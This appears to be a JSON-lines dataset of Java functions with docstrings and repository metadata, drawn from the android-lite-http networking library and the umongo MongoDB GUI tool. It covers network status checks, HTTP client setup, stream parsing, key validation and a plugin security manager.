{"docstring": "/**\n * \u662f\u5426\u5b58\u5728\u6709\u6548\u7684\u79fb\u52a8\u8fde\u63a5\n * @param context\n * @return boolean\n */\n", "func_signal": "public static boolean isMobileConnected(Context context)", "code": "{\n\tNetworkInfo net = getConnManager(context).getActiveNetworkInfo();\n\treturn net != null && net.getType() == ConnectivityManager.TYPE_MOBILE && net.isConnected();\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * Used <code>retryCount</code> and <code>requestSentRetryEnabled</code> to determine\n * if the given method should be retried.\n */\n", "func_signal": "public boolean retryRequest(final IOException exception, final int executionCount, final HttpContext context)", "code": "{\n    if (executionCount > this.retryCount) {\n        // Do not retry if over max retry count\n        return false;\n    }\n    if (this.nonRetriableClasses.contains(exception.getClass())) {\n        return false;\n    } else {\n        for (final Class<? extends IOException> rejectException : this.nonRetriableClasses) {\n            if (rejectException.isInstance(exception)) {\n                return false;\n            }\n        }\n    }\n    return retryRequest(context);\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\DefaultHttpRequestRetryHandler.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * \u6253\u5370\u5f53\u524d\u5404\u79cd\u7f51\u7edc\u72b6\u6001\n * @param context\n * @return boolean\n */\n", "func_signal": "public static boolean printNetworkInfo(Context context)", "code": "{\n\tConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);\n\tif (connectivity != null) {\n\t\tNetworkInfo in = connectivity.getActiveNetworkInfo();\n\t\tHttpLog.i(TAG, \"-------------$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$-------------\");\n\t\tHttpLog.i(TAG, \"getActiveNetworkInfo: \" + in);\n\t\tNetworkInfo[] info = connectivity.getAllNetworkInfo();\n\t\tif (info != null) {\n\t\t\tfor (int i = 0; i < info.length; i++) {\n\t\t\t\t// if (info[i].getType() == ConnectivityManager.TYPE_WIFI) {\n\t\t\t\tHttpLog.i(TAG, \"NetworkInfo[\" + i + \"]isAvailable : \" + info[i].isAvailable());\n\t\t\t\tHttpLog.i(TAG, \"NetworkInfo[\" + i + \"]isConnected : \" + info[i].isConnected());\n\t\t\t\tHttpLog.i(TAG, \"NetworkInfo[\" + i + \"]isConnectedOrConnecting : \" + info[i].isConnectedOrConnecting());\n\t\t\t\tHttpLog.i(TAG, \"NetworkInfo[\" + i + \"]: \" + info[i]);\n\t\t\t\t// }\n\t\t\t}\n\t\t\tHttpLog.i(TAG, \"\\n\");\n\t\t} else {\n\t\t\tHttpLog.i(TAG, \"getAllNetworkInfo is null\");\n\t\t}\n\t}\n\treturn false;\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * parse input stream to byte array.\n *\n * @param is  input stream\n * @param len total len\n * @return byte data\n */\n", "func_signal": "protected final byte[] streamToByteArray(InputStream is, long len) throws IOException", "code": "{\n    //if (len > 0) {\n    //    final ByteArrayBuffer buffer = new ByteArrayBuffer((int) len);\n    //    final byte[] tmp = new byte[buffSize];\n    //    int l;\n    //    while (!request.isCancelledOrInterrupted() && (l = is.read(tmp)) != -1) {\n    //        buffer.append(tmp, 0, l);\n    //        readLength += l;\n    //    }\n    //    return translateBytes(buffer.toByteArray());\n    //} else {\n    ByteArrayOutputStream swapStream = new ByteArrayOutputStream();\n    try {\n        byte[] buff = new byte[buffSize];\n        int l = 0;\n        while (!request.isCancelledOrInterrupted() && (l = is.read(buff)) > 0) {\n            swapStream.write(buff, 0, l);\n            readLength += l;\n        }\n        return translateBytes(swapStream.toByteArray());\n    } finally {\n        swapStream.close();\n    }\n    //}\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\parser\\MemCacheableParser.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * parse input stream to string.\n *\n * @param stream  input stream\n * @param len     total len\n * @param charSet char set\n * @return string data\n */\n", "func_signal": "protected final String streamToString(InputStream stream, long len, String charSet) throws IOException", "code": "{\n    //if (len > 0) {\n    //    Reader reader = new InputStreamReader(stream, charSet);\n    //    CharArrayBuffer buffer = new CharArrayBuffer((int) len);\n    //    try {\n    //        char[] tmp = new char[buffSize];\n    //        int l;\n    //        while (!request.isCancelledOrInterrupted() && (l = reader.read(tmp)) != -1) {\n    //            buffer.append(tmp, 0, l);\n    //            readLength += l;\n    //            if (buffSize < len) {\n    //                notifyReading(len, readLength);\n    //            }\n    //        }\n    //    } finally {\n    //        reader.close();\n    //    }\n    //    return translateString(buffer.toString());\n    //} else {\n    ByteArrayOutputStream swapStream = new ByteArrayOutputStream();\n    try {\n        byte[] buff = new byte[buffSize];\n        int l = 0;\n        while (!request.isCancelledOrInterrupted() && (l = stream.read(buff)) > 0) {\n            swapStream.write(buff, 0, l);\n            readLength += l;\n            notifyReading(len, readLength);\n        }\n        return translateString(swapStream.toString(charSet));\n    } finally {\n        swapStream.close();\n    }\n    //}\n\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\parser\\MemCacheableParser.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * \u5224\u65ad\u7f51\u7edc\u8fde\u63a5\u662f\u5426\u6709\u6548\uff08\u6b64\u65f6\u53ef\u4f20\u8f93\u6570\u636e\uff09\u3002\n * @param context\n * @return boolean \u4e0d\u7ba1wifi\uff0c\u8fd8\u662fmobile net\uff0c\u53ea\u6709\u5f53\u524d\u5728\u8fde\u63a5\u72b6\u6001\uff08\u53ef\u6709\u6548\u4f20\u8f93\u6570\u636e\uff09\u624d\u8fd4\u56detrue,\u53cd\u4e4bfalse\u3002\n */\n", "func_signal": "public static boolean isConnected(Context context)", "code": "{\n\tNetworkInfo net = getConnManager(context).getActiveNetworkInfo();\n\treturn net != null && net.isConnected();\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * \u8bbe\u5907\u662f\u5426\u6253\u5f00\u79fb\u52a8\u7f51\u7edc\u5f00\u5173\n * @param context\n * @return boolean \u6253\u5f00\u79fb\u52a8\u7f51\u7edc\u8fd4\u56detrue\uff0c\u53cd\u4e4bfalse\n */\n", "func_signal": "public static boolean isMobileEnabled(Context context)", "code": "{\n\ttry {\n\t\tMethod getMobileDataEnabledMethod = ConnectivityManager.class.getDeclaredMethod(\"getMobileDataEnabled\");\n\t\tgetMobileDataEnabledMethod.setAccessible(true);\n\t\treturn (Boolean) getMobileDataEnabledMethod.invoke(getConnManager(context));\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\t// \u53cd\u5c04\u5931\u8d25\uff0c\u9ed8\u8ba4\u5f00\u542f\n\treturn true;\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/*__________________________ implemention_methods __________________________*/\n", "func_signal": "@Override\npublic void config(HttpConfig config)", "code": "{\n    if (mHttpClient != null) {\n        HttpParams params = mHttpClient.getParams();\n        HttpConnectionParams.setConnectionTimeout(params, config.getConnectTimeout());\n        HttpConnectionParams.setSoTimeout(params, config.getSocketTimeout());\n        HttpProtocolParams.setUserAgent(params, config.getUserAgent());\n        mHttpClient.setParams(params);\n    }\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\ApacheClient.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * register http and https scheme, and got ThreadSafeClientConnManager\n *\n * @return ThreadSafeClientConnManager\n */\n", "func_signal": "private ThreadSafeClientConnManager createClientConnManager(BasicHttpParams httpParams)", "code": "{\n    SchemeRegistry schemeRegistry = new SchemeRegistry();\n    SSLSocketFactory socketFactory = MySSLSocketFactory.getFixedSocketFactory();\n    schemeRegistry.register(new Scheme(Consts.SCHEME_HTTP,\n                                       PlainSocketFactory.getSocketFactory(),\n                                       HttpConfig.DEFAULT_HTTP_PORT));\n    schemeRegistry.register(new Scheme(Consts.SCHEME_HTTPS, socketFactory, HttpConfig.DEFAULT_HTTPS_PORT));\n    return new ThreadSafeClientConnManager(httpParams, schemeRegistry);\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\ApacheClient.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * \u662f\u5426\u5b58\u5728\u6709\u6548\u7684WIFI\u8fde\u63a5\n */\n", "func_signal": "public static boolean isWifiConnected(Context context)", "code": "{\n\tNetworkInfo net = getConnManager(context).getActiveNetworkInfo();\n\treturn net != null && net.getType() == ConnectivityManager.TYPE_WIFI && net.isConnected();\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * \u5224\u65ad\u6709\u65e0\u7f51\u7edc\u6b63\u5728\u8fde\u63a5\u4e2d\uff08\u67e5\u627e\u7f51\u7edc\u3001\u6821\u9a8c\u3001\u83b7\u53d6IP\u7b49\uff09\u3002\n * @param context\n * @return boolean \u4e0d\u7ba1wifi\uff0c\u8fd8\u662fmobile net\uff0c\u53ea\u6709\u5f53\u524d\u5728\u8fde\u63a5\u72b6\u6001\uff08\u53ef\u6709\u6548\u4f20\u8f93\u6570\u636e\uff09\u624d\u8fd4\u56detrue,\u53cd\u4e4bfalse\u3002\n */\n", "func_signal": "public static boolean isConnectedOrConnecting(Context context)", "code": "{\n\tNetworkInfo[] nets = getConnManager(context).getAllNetworkInfo();\n\tif (nets != null) {\n\t\tfor (NetworkInfo net : nets) {\n\t\t\tif (net.isConnectedOrConnecting()) { return true; }\n\t\t}\n\t}\n\treturn false;\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "// ******************** Log **************************\n", "func_signal": "public static int v(String tag, String msg)", "code": "{\n    if (isPrint) {\n        if (msg == null) {\n            android.util.Log.v(tag, NULL);\n        } else {\n            android.util.Log.v(tag, msg);\n        }\n    }\n    return -1;\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\log\\HttpLog.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * Create the request retry handler using the following list of\n * non-retriable IOException classes: <br>\n * <ul>\n * <li>InterruptedIOException</li>\n * <li>UnknownHostException</li>\n * <li>ConnectException</li>\n * <li>SSLException</li>\n * </ul>\n *\n * @param retryCount              how many times to retry; 0 means no retries\n * @param requestSentRetryEnabled true if it's OK to retry requests that have been sent\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\npublic DefaultHttpRequestRetryHandler(final int retryCount, final boolean requestSentRetryEnabled)", "code": "{\n    this(retryCount, requestSentRetryEnabled, Arrays.asList(InterruptedIOException.class,\n            UnknownHostException.class, ConnectException.class, SSLException.class));\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\DefaultHttpRequestRetryHandler.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * new {@link DefaultHttpClient}, and set strategy.\n *\n * @return DefaultHttpClient\n */\n", "func_signal": "private DefaultHttpClient createApacheHttpClient(BasicHttpParams httpParams)", "code": "{\n    DefaultHttpClient httpClient = new DefaultHttpClient(createClientConnManager(httpParams), httpParams);\n    // disable apache default redirect handler\n    httpClient.setRedirectHandler(new RedirectHandler() {\n\n        @Override\n        public boolean isRedirectRequested(HttpResponse response, HttpContext context) {\n            return false;\n        }\n\n        @Override\n        public URI getLocationURI(HttpResponse response, HttpContext context) {\n            return null;\n        }\n    });\n    // disable apache default retry handler\n    httpClient.setHttpRequestRetryHandler(new HttpRequestRetryHandler() {\n        @Override\n        public boolean retryRequest(IOException exception, int executionCount, HttpContext context) {\n            return false;\n        }\n    });\n    // enable gzip supporting in request\n    httpClient.addRequestInterceptor(new HttpRequestInterceptor() {\n        @Override\n        public void process(HttpRequest request, HttpContext context) {\n            if (!request.containsHeader(Consts.HEADER_ACCEPT_ENCODING)) {\n                request.addHeader(Consts.HEADER_ACCEPT_ENCODING, Consts.ENCODING_GZIP);\n            }\n        }\n    });\n    // enable gzip supporting in response\n    httpClient.addResponseInterceptor(new HttpResponseInterceptor() {\n        @Override\n        public void process(HttpResponse response, HttpContext context) {\n            final HttpEntity entity = response.getEntity();\n            if (entity == null) {\n                return;\n            }\n            final Header encoding = entity.getContentEncoding();\n            if (encoding != null) {\n                for (HeaderElement element : encoding.getElements()) {\n                    if (element.getName().equalsIgnoreCase(Consts.ENCODING_GZIP)) {\n                        response.setEntity(new GZIPEntityWrapper(entity));\n                        break;\n                    }\n                }\n            }\n        }\n    });\n    // setKeepAlive(httpClient);\n    return httpClient;\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\ApacheClient.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * initialize HttpParams , initialize settings such as total connextions,timeout ...\n */\n", "func_signal": "private BasicHttpParams createHttpParams()", "code": "{\n    BasicHttpParams params = new BasicHttpParams();\n    ConnManagerParams.setTimeout(params, DEFAULT_TIMEOUT);\n    ConnManagerParams.setMaxConnectionsPerRoute(params, new ConnPerRouteBean(DEFAULT_MAX_CONN_PER_ROUT));\n    ConnManagerParams.setMaxTotalConnections(params, DEFAULT_MAX_CONN_TOTAL);\n    HttpConnectionParams.setTcpNoDelay(params, TCP_NO_DELAY);\n    HttpConnectionParams.setConnectionTimeout(params, DEFAULT_TIMEOUT);\n    HttpConnectionParams.setSoTimeout(params, DEFAULT_TIMEOUT);\n    HttpConnectionParams.setSocketBufferSize(params, DEFAULT_BUFFER_SIZE);\n    HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);\n    HttpProtocolParams.setUserAgent(params, userAgent);\n    // settingOthers(params);\n    return params;\n}", "path": "apache-client\\src\\main\\java\\com\\litesuits\\http\\impl\\apache\\ApacheClient.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * \u5224\u65ad\u6709\u65e0\u53ef\u7528\u72b6\u6001\u7684\u79fb\u52a8\u7f51\u7edc\uff0c\u6ce8\u610f\u5173\u6389\u8bbe\u5907\u79fb\u52a8\u7f51\u7edc\u76f4\u63a5\u4e0d\u5f71\u54cd\u6b64\u51fd\u6570\u3002\n * \u4e5f\u5c31\u662f\u5373\u4f7f\u5173\u6389\u79fb\u52a8\u7f51\u7edc\uff0c\u90a3\u4e48\u79fb\u52a8\u7f51\u7edc\u4e5f\u53ef\u80fd\u662f\u53ef\u7528\u7684(\u5f69\u4fe1\u7b49\u670d\u52a1)\uff0c\u5373\u8fd4\u56detrue\u3002\n * \u4ee5\u4e0b\u60c5\u51b5\u5b83\u662f\u4e0d\u53ef\u7528\u7684\uff0c\u5c06\u8fd4\u56defalse\uff1a\n *  1. \u8bbe\u5907\u6253\u5f00\u98de\u884c\u6a21\u5f0f\uff1b\n *  2. \u8bbe\u5907\u6240\u5728\u533a\u57df\u6ca1\u6709\u4fe1\u53f7\u8986\u76d6\uff1b\n *  3. \u8bbe\u5907\u5728\u6f2b\u6e38\u533a\u57df\uff0c\u4e14\u5173\u95ed\u4e86\u7f51\u7edc\u6f2b\u6e38\u3002\n * \n * @param context\n * @return boolean\n */\n", "func_signal": "public static boolean isMobileAvailable(Context context)", "code": "{\n\tNetworkInfo[] nets = getConnManager(context).getAllNetworkInfo();\n\tif (nets != null) {\n\t\tfor (NetworkInfo net : nets) {\n\t\t\tif (net.getType() == ConnectivityManager.TYPE_MOBILE) { return net.isAvailable(); }\n\t\t}\n\t}\n\treturn false;\n}", "path": "litehttp\\src\\main\\java\\com\\litesuits\\http\\network\\Network.java", "repo_name": "litesuits/android-lite-http", "stars": 828, "license": "apache-2.0", "language": "java", "size": 10699}
{"docstring": "/**\n * Checks key strings for invalid characters.\n */\n", "func_signal": "public static void checkKeys( Map<String, Object> o )", "code": "{\n    for ( String s : o.keySet() ){\n        validateKey ( s );\n        Object inner = o.get( s );\n        if ( inner instanceof DBObject ) {\n            checkKeys( (DBObject)inner );\n        } else if ( inner instanceof Map ) {\n            checkKeys( (Map<String, Object>)inner );\n        }\n    }\n}", "path": "src\\com\\edgytech\\umongo\\MongoUtils.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Following method doesnt really work because the log buffer is a short moving window\n */\n", "func_signal": "public void swapContent(String text)", "code": "{\n    TextArea ta = (TextArea) getBoundUnit(Item.textArea);\n//        int pos = ta.getTextArea().getCaretPosition();\n    int val = ta.getComponent().getVerticalScrollBar().getValue();\n    int max = ta.getComponent().getVerticalScrollBar().getMaximum();\n    int vis = ta.getComponent().getVerticalScrollBar().getVisibleAmount();\n    \n    setStringFieldValue(Item.textArea, text);\n    updateComponent();\n\n    // scroll resets, set it back if not to close to the end\n//        System.out.println(val + \" \" + max + \" \" + vis);\n    if (val < max - vis)\n        ta.getComponent().getVerticalScrollBar().setValue(val);\n}", "path": "src\\com\\edgytech\\umongo\\TextView.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "////////////////////////////////////////////////////////////////////////\n// Component\n////////////////////////////////////////////////////////////////////////\n", "func_signal": "@Override\nprotected BoxPanel createComponent()", "code": "{\n    BoxPanel panel = new BoxPanel(Axis.Y, false);\n    return panel;\n}", "path": "src\\com\\edgytech\\umongo\\Workspace.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Loaded code can't define classes in java.* or sun.* packages\n */\n", "func_signal": "public void checkPackageDefinition(String pkg)", "code": "{\n    if (inClassLoader() && ((pkg.startsWith(\"java.\") || pkg.startsWith(\"javax.\") || pkg.startsWith(\"sun.\")))) {\n        throw new SecurityException();\n    }\n}", "path": "src\\com\\edgytech\\umongo\\PluginSecurityManager.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * create a doc view with an iterator or a cursor\n *\n * @param id\n * @param label\n * @param job\n * @param root\n * @param iterator\n */\n", "func_signal": "public DocView(String id, String label, DbJob job, Object root, Iterator<DBObject> iterator)", "code": "{\n    this(id, label, job, root);\n\n    if (iterator instanceof DBCursor) {\n        this.dbcursor = (DBCursor) iterator;\n        this.iterator = dbcursor;\n        ((MenuItem) getBoundUnit(Item.refresh)).enabled = true;\n        ((MenuItem) getBoundUnit(Item.startAutoUpdate)).enabled = true;\n    } else {\n        this.iterator = iterator;\n    }\n    getMore(null);\n}", "path": "src\\com\\edgytech\\umongo\\DocView.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "//    public void findOne(final ButtonBase button) {\n//        final DBCollection col = getCollectionNode().getCollection();\n//        final DBObject query = ((DocBuilderField) getBoundUnit(Item.foQuery)).getDBObject();\n//        final DBObject fields = ((DocBuilderField) getBoundUnit(Item.foFields)).getDBObject();\n//\n//        new DbJob() {\n//\n//            @Override\n//            public Object doRun() {\n//                return col.findOne(query, fields);\n//            }\n//\n//            @Override\n//            public String getNS() {\n//                return col.getFullName();\n//            }\n//\n//            @Override\n//            public String getShortName() {\n//                return \"FindOne\";\n//            }\n//\n//            @Override\n//            public DBObject getRoot(Object result) {\n//                DBObject root = new BasicDBObject(\"query\", query);\n//                root.put(\"fields\", fields);\n//                return root;\n//            }\n//\n//            @Override\n//            public ButtonBase getButton() {\n//                return button;\n//            }\n//        }.addJob();\n//    }\n", "func_signal": "public void rename(ButtonBase button)", "code": "{\n        final CollectionNode colNode = getCollectionNode();\n        final DBCollection col = colNode.getCollection();\n        // select parent since this is getting renamed\n        UMongo.instance.displayNode(colNode.getDbNode());\n\n        final String name = getStringFieldValue(Item.newName);\n        final boolean dropTarget = getBooleanFieldValue(Item.dropTarget);\n\n        DBObject cmd = BasicDBObjectBuilder.start()\n                .add(\"renameCollection\", col.getFullName())\n                .add(\"to\", col.getDB().getName() + \".\" + name)\n                .add(\"dropTarget\", dropTarget)\n                .get();\n        new DbJobCmd(col.getDB().getSisterDB(\"admin\"), cmd, null, null).addJob();\n    }", "path": "src\\com\\edgytech\\umongo\\CollectionPanel.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * This is the basic method that tests whether there is a class loaded by a\n * ClassLoader anywhere on the stack. If so, it means that that untrusted\n * code is trying to perform some kind of sensitive operation. We prevent it\n * from performing that operation by throwing an exception. trusted() is\n * called by most of the check...() methods below.\n */\n", "func_signal": "protected void trusted()", "code": "{\n    if (inClassLoader()) {\n        throw new SecurityException();\n    }\n}", "path": "src\\com\\edgytech\\umongo\\PluginSecurityManager.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Checks key strings for invalid characters.\n */\n", "func_signal": "public static void checkKeys( DBObject o )", "code": "{\n    if ( o instanceof LazyDBObject || o instanceof LazyDBList )\n        return;\n\n    for ( String s : o.keySet() ){\n        validateKey ( s );\n        Object inner = o.get( s );\n        if ( inner instanceof DBObject ) {\n            checkKeys( (DBObject)inner );\n        } else if ( inner instanceof Map ) {\n            checkKeys( (Map<String, Object>)inner );\n        }\n    }\n}", "path": "src\\com\\edgytech\\umongo\\MongoUtils.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * create a doc view with static document\n *\n * @param id\n * @param label\n * @param job\n * @param root\n * @param doc\n */\n", "func_signal": "public DocView(String id, String label, DbJob job, Object root, DBObject doc)", "code": "{\n    this(id, label, job, root);\n\n    if (doc != null) {\n        addDocument(doc, job, true);\n    }\n}", "path": "src\\com\\edgytech\\umongo\\DocView.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "//    protected void appendDoc(DBObject doc) {\n//        TreeNodeLabel node = new TreeNodeLabel();\n//        node.forceTreeNode(MongoUtils.dbObjectToTreeNode(doc));\n//        getTree().addChild(node);\n//    }\n", "func_signal": "public void collapseAll(ButtonBase button)", "code": "{\n        getTree().collapseAll();\n        // need to reexpand root\n        getTree().expandNode(getTree().getTreeNode());\n    }", "path": "src\\com\\edgytech\\umongo\\DocView.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Loaded code can only load classes from java.* packages\n */\n", "func_signal": "public void checkPackageAccess(String pkg)", "code": "{\n    if (inClassLoader() && !pkg.startsWith(\"java.\") && !pkg.startsWith(\"javax.\")) {\n        throw new SecurityException();\n    }\n}", "path": "src\\com\\edgytech\\umongo\\PluginSecurityManager.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * create a doc view with static document\n *\n * @param id\n * @param label\n * @param job\n * @param root\n * @param doc\n */\n", "func_signal": "public TextView(String id, String label, DbJob job, String text)", "code": "{\n    this(id, label, job);\n\n    if (text != null) {\n        setContent(text);\n    }\n}", "path": "src\\com\\edgytech\\umongo\\TextView.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Check for invalid key names\n * @param s the string field/key to check\n * @exception IllegalArgumentException if the key is not valid.\n */\n", "func_signal": "public static void validateKey(String s )", "code": "{\n    if ( s.contains( \".\" ) )\n        throw new IllegalArgumentException( \"fields stored in the db can't have . in them. (Bad Key: '\" + s + \"')\" );\n    if ( s.startsWith( \"$\" ) )\n        throw new IllegalArgumentException( \"fields stored in the db can't start with '$' (Bad Key: '\" + s + \"')\" );\n}", "path": "src\\com\\edgytech\\umongo\\MongoUtils.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Creates a new instance of FieldFile\n */\n", "func_signal": "public DocBuilderField()", "code": "{\n    nonEmpty = false;\n\n    try {\n        xmlLoad(Resource.getXmlDir(), Resource.File.docBuilderField, null);\n        // need to still load fields from other config, and do a proper checkpoint\n        setState(State.STRUCTURE);\n    } catch (Exception ex) {\n        getLogger().log(Level.SEVERE, null, ex);\n    }\n    setEnumBinding(Item.values(), this);\n}", "path": "src\\com\\edgytech\\umongo\\DocBuilderField.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "//    @Override\n//    protected BoxPanel createComponent() {\n//        BoxPanel panel = new BoxPanel(Common.Axis.X, true);\n//        _field = new JLabel(\"\");\n//        panel.add(_field);\n//\n////        _button = new JButton(SwingFast.createImageIcon(\"/img/zoomIn.png\"));\n//        _button = new JButton(\">\");\n//        _button.addActionListener(this);\n//        panel.add(_button);\n//        return panel;\n//    }\n", "func_signal": "@Override\n    protected void structureComponentCustom(JLabel comp)", "code": "{\n        comp.addMouseListener(this);\n        comp.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));\n        icon = \"zoomIn.png\";\n        iconGroup = \"icons\";\n    }", "path": "src\\com\\edgytech\\umongo\\DocField.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "//    static void doFindOne(final DBCollection col, final DBObject query, final DBObject fields) {\n//        new DbJob() {\n//\n//            @Override\n//            public Object doRun() {\n//                return col.findOne(query, fields);\n//            }\n//\n//            @Override\n//            public String getNS() {\n//                return col.getFullName();\n//            }\n//\n//            @Override\n//            public String getShortName() {\n//                return \"FindOne\";\n//            }\n//\n//            @Override\n//            public DBObject getRoot(Object result) {\n//                BasicDBObject obj = new BasicDBObject(\"query\", query);\n//                obj.put(\"fields\", fields);\n//                return obj;\n//            }\n//        }.addJob();\n//    }\n", "func_signal": "public void dropCollection(ButtonBase button)", "code": "{\n        final CollectionNode colNode = getCollectionNode();\n        final DBCollection col = getCollectionNode().getCollection();\n        BasicDBObject cmd = new BasicDBObject( \"drop\" , col.getName() );\n        new DbJobCmd(col.getDB(), cmd, null, colNode.getDbNode(), null).addJob();\n    }", "path": "src\\com\\edgytech\\umongo\\CollectionPanel.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "////////////////////////////////////////////////////////////////////////\n// Component\n////////////////////////////////////////////////////////////////////////\n", "func_signal": "@Override\nprotected boolean checkComponentCustom(BoxPanel comp)", "code": "{\n//        String txt = _field.getText().trim();\n    String txt = getComponentStringFieldValue(Item.jsonText);\n    if (nonEmpty && txt.isEmpty()) {\n        setDisplayError(\"Field cannot be empty\");\n        return false;\n    }\n\n    if (!getComponentBooleanFieldValue(Item.validate)) {\n        return true;\n    }\n    \n    try {\n        // 1st parse with GSON to check, since our parser has bugs\n        MongoUtils.getJsonParser().parse(txt);\n        \n        DBObject doc = (DBObject) JSON.parse(txt);\n        return true;\n    } catch (Exception e) {\n        // this could be because of binary in field\n        getLogger().log(Level.INFO, null, e);\n    }\n    setDisplayError(\"Invalid JSON format: correct or disable validation\");\n\n    return false;\n}", "path": "src\\com\\edgytech\\umongo\\DocBuilderField.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Creates a new instance of FieldFile\n */\n", "func_signal": "public DocFieldText()", "code": "{\n    try {\n        xmlLoad(Resource.getXmlDir(), Resource.File.docFieldText, null);\n    } catch (Exception ex) {\n        getLogger().log(Level.SEVERE, null, ex);\n    }\n    setEnumBinding(Item.values(), this);\n}", "path": "src\\com\\edgytech\\umongo\\DocFieldText.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * This is the one SecurityManager method that is different from the others.\n * It indicates whether a top-level window should display an \"untrusted\"\n * warning. The window is always allowed to be created, so this method is\n * not normally meant to throw an exception. It should return true if the\n * window does not need to display the warning, and false if it does. In\n * this example, however, our text-based Service classes should never need\n * to create windows, so we will actually throw an exception to prevent any\n * windows from being opened.\n\t *\n */\n", "func_signal": "public boolean checkTopLevelWindow(Object window)", "code": "{\n    trusted();\n    return true;\n}", "path": "src\\com\\edgytech\\umongo\\PluginSecurityManager.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
{"docstring": "/**\n * Creates a new instance of FieldFile\n */\n", "func_signal": "public DocFieldText(String id, String key, Object value, DocFieldObject object)", "code": "{\n    this();\n    setId(id);\n    setLabel(key);\n    this.key = key;\n    this.value = value;\n    this._object = object;\n    setStringFieldValue(Item.value, MongoUtils.getJSONPreview(value));\n    if (value == null)\n        getJComponentBoundUnit(Item.edit).visible = false;\n}", "path": "src\\com\\edgytech\\umongo\\DocFieldText.java", "repo_name": "agirbal/umongo", "stars": 580, "license": "None", "language": "java", "size": 8593}
